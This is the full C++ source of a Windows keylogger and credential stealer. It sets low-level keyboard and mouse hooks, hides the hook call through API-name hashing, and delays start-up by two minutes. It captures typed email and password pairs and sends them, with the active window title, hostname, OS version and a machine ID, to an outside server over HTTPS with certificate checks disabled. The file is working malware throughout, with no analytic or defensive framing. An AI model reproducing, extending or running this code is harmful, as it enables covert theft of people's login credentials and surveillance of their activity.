#include <windows.h>
#include <winhttp.h>
#include <bcrypt.h>
#include <psapi.h>
#include <string>
#include <regex>
#include <sstream>
#include <fstream>
#include <shlobj.h>
#include <iomanip>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "bcrypt.lib")

// --- 1. SHA-256 CRYPTO ENGINE ---
std::string Sha256(const std::string& input) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_HASH_HANDLE hHash = NULL;
    DWORD cbData = 0, cbHash = 0, cbHashObject = 0;
    PBYTE pbHashObject = NULL, pbHash = NULL;

    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0) return "";
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbHashObject, sizeof(DWORD), &cbData, 0);
    pbHashObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbHashObject);
    BCryptGetProperty(hAlg, BCRYPT_HASH_LENGTH, (PBYTE)&cbHash, sizeof(DWORD), &cbData, 0);
    pbHash = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbHash);
    
    if (BCryptCreateHash(hAlg, &hHash, pbHashObject, cbHashObject, NULL, 0, 0) == 0) {
        BCryptHashData(hHash, (PBYTE)input.c_str(), (ULONG)input.length(), 0);
        BCryptFinishHash(hHash, pbHash, cbHash, 0);
    }

    std::stringstream ss;
    for (DWORD i = 0; i < cbHash; i++) ss << std::hex << std::setw(2) << std::setfill('0') << (int)pbHash[i];
    
    if (hHash) BCryptDestroyHash(hHash);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    HeapFree(GetProcessHeap(), 0, pbHashObject);
    HeapFree(GetProcessHeap(), 0, pbHash);
    return ss.str();
}

// --- 2. SYSTEM METADATA ---
std::string GetMachineId() {
    HW_PROFILE_INFOA hw;
    if (GetCurrentHwProfileA(&hw)) {
        std::string guid = hw.szHwProfileGuid;
        // Clean curly braces: {ID} -> ID
        guid = std::regex_replace(guid, std::regex(R"([{}])"), "");
        return Sha256(guid);
    }
    return "unknown_machine_id";
}

std::string GetHostname() {
    char buffer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(buffer);
    return GetComputerNameA(buffer, &size) ? std::string(buffer) : "UnknownHost";
}

std::string GetOSVersion() {
    NTSTATUS(WINAPI * RtlGetVersion)(PRTL_OSVERSIONINFOW);
    HMODULE hMod = GetModuleHandleA("ntdll.dll");
    if (hMod) {
        RtlGetVersion = (NTSTATUS(WINAPI*)(PRTL_OSVERSIONINFOW))GetProcAddress(hMod, "RtlGetVersion");
        if (RtlGetVersion) {
            RTL_OSVERSIONINFOW rovi = { 0 };
            rovi.dwOSVersionInfoSize = sizeof(rovi);
            if (RtlGetVersion(&rovi) == 0)
                return "Windows Build " + std::to_string(rovi.dwMajorVersion) + "." + std::to_string(rovi.dwBuildNumber);
        }
    }
    return "Windows x64";
}

std::string GetActiveWindowTitle() {
    char title[256];
    HWND hwnd = GetForegroundWindow();
    GetWindowTextA(hwnd, title, sizeof(title));
    return std::string(title);
}

// --- 3. DEBUG LOGGING ---
void WriteDebug(std::string msg) {
    std::ofstream f1("internal_status.txt", std::ios::app);
    if (f1.is_open()) { f1 << "[DEBUG] " << msg << std::endl; f1.close(); }

    char path[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, path) == S_OK) {
        std::string fullPath = std::string(path) + "\\debug_log.txt";
        std::ofstream f2(fullPath, std::ios::app);
        if (f2.is_open()) { f2 << "[DEBUG] " << msg << std::endl; f2.close(); }
    }
}

// --- 4. API HASHING ENGINE ---
constexpr DWORD HashString(const char* str) {
    DWORD hash = 0x811c9dc5;
    while (*str) { hash ^= (BYTE)*str++; hash *= 0x01000193; }
    return hash;
}

FARPROC GetProcAddressH(HMODULE hMod, DWORD targetHash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* names = (DWORD*)((BYTE*)hMod + exp->AddressOfNames);
    WORD* ords = (WORD*)((BYTE*)hMod + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)((BYTE*)hMod + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        if (HashString((const char*)((BYTE*)hMod + names[i])) == targetHash)
            return (FARPROC)((BYTE*)hMod + funcs[ords[i]]);
    }
    return NULL;
}

// --- 5. EXFILTRATION ---
void UploadData(std::string email, std::string pass) {
    HINTERNET hS = WinHttpOpen(L"Mozilla/5.0", 1, NULL, NULL, 0);
    HINTERNET hC = WinHttpConnect(hS, L"systemint.onrender.com", 443, 0);
    HINTERNET hR = WinHttpOpenRequest(hC, L"POST", L"/api/sync", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    
    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    WinHttpSetOption(hR, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

    std::stringstream ss;
    ss << "{"
       << "\"machineId\": \"" << GetMachineId() << "\","
       << "\"type\": \"Keylogger\","
       << "\"data\": {"
       <<     "\"WindowsTitle\": \"" << GetActiveWindowTitle() << "\","
       <<     "\"email\": \"" << email << "\","
       <<     "\"password\": \"" << pass << "\""
       << "},"
       << "\"systemMeta\": {"
       <<     "\"os\": \"" << GetOSVersion() << "\","
       <<     "\"hostname\": \"" << GetHostname() << "\""
       << "}"
       << "}";

    std::string json = ss.str();
    if(WinHttpSendRequest(hR, L"Content-Type: application/json\r\n", -1, (LPVOID)json.c_str(), (DWORD)json.length(), (DWORD)json.length(), 0)) {
        WinHttpReceiveResponse(hR, NULL);
        WriteDebug("Payload Delivered: " + json);
    }
    WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
}

// --- 6. CORE ENGINE ---
std::string buffer = "";
std::string savedEmail = "";

bool IsEmail(const std::string& s) {
    const std::regex e_reg(R"((\w+)(\.|_)?(\w*)@(\w+)(\.(\w+))+)", std::regex_constants::icase);
    return std::regex_match(s, e_reg);
}

void ProcessBuffer() {
    if (buffer.empty()) return;

    // Reject passwords containing spaces (validation rule)
    if (buffer.find(' ') != std::string::npos) {
        WriteDebug("Space detected. Clearing buffer: " + buffer);
        buffer.clear();
        return;
    }

    if (IsEmail(buffer)) {
        savedEmail = buffer;
        WriteDebug("Email Stored: " + savedEmail);
    } else if (buffer.length() >= 8 && !savedEmail.empty()) {
        UploadData(savedEmail, buffer);
        savedEmail.clear();
    }
    buffer.clear();
}

LRESULT CALLBACK KeyProc(int n, WPARAM w, LPARAM l) {
    if (n == HC_ACTION && w == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)l;
        bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;

        if (k->vkCode == VK_RETURN || k->vkCode == VK_TAB) ProcessBuffer();
        else if (k->vkCode == VK_BACK) { if(!buffer.empty()) buffer.pop_back(); }
        else if (k->vkCode >= 0x41 && k->vkCode <= 0x5A) {
            char c = (char)k->vkCode;
            if (!shift) c = tolower(c);
            buffer += c;
        }
        else if (k->vkCode >= 0x30 && k->vkCode <= 0x39) {
            if (shift) {
                switch (k->vkCode) {
                    case 0x31: buffer += "!"; break;
                    case 0x32: buffer += "@"; break;
                    case 0x33: buffer += "#"; break;
                    case 0x34: buffer += "$"; break;
                    case 0x35: buffer += "%"; break;
                    case 0x36: buffer += "^"; break;
                    case 0x37: buffer += "&"; break;
                    case 0x38: buffer += "*"; break;
                    case 0x39: buffer += "("; break;
                    case 0x30: buffer += ")"; break;
                }
            } else { buffer += (char)k->vkCode; }
        }
        else if (k->vkCode == VK_OEM_PERIOD) buffer += (shift ? ">" : ".");
        else if (k->vkCode == VK_OEM_COMMA)  buffer += (shift ? "<" : ",");
        else if (k->vkCode == VK_OEM_2)      buffer += (shift ? "?" : "/");
        else if (k->vkCode == VK_OEM_7)      buffer += (shift ? "\"" : "'");
        else if (k->vkCode == VK_OEM_1)      buffer += (shift ? ":" : ";");
        else if (k->vkCode == VK_SPACE)      buffer += " ";
    }
    return CallNextHookEx(NULL, n, w, l);
}

LRESULT CALLBACK MouseProc(int n, WPARAM w, LPARAM l) {
    if (n == HC_ACTION && w == WM_LBUTTONDOWN) ProcessBuffer();
    return CallNextHookEx(NULL, n, w, l);
}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
    WriteDebug("=== PROGRAM STARTED ===");
    Sleep(120000); 

    HMODULE u32 = GetModuleHandleA("user32.dll");
    if (!u32) u32 = LoadLibraryA("user32.dll");

    auto _SetHook = (HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD))GetProcAddressH(u32, 0xDE2B4659);

    if (!_SetHook) {
        WriteDebug("API Hashing Failed. Switching to Direct Fallback...");
        _SetHook = (HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD))GetProcAddress(u32, "SetWindowsHookExA");
    }

    if (_SetHook) {
        _SetHook(WH_KEYBOARD_LL, KeyProc, h, 0);
        _SetHook(WH_MOUSE_LL, MouseProc, h, 0);
        WriteDebug("Hooks Online.");
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }
    return 0;
}
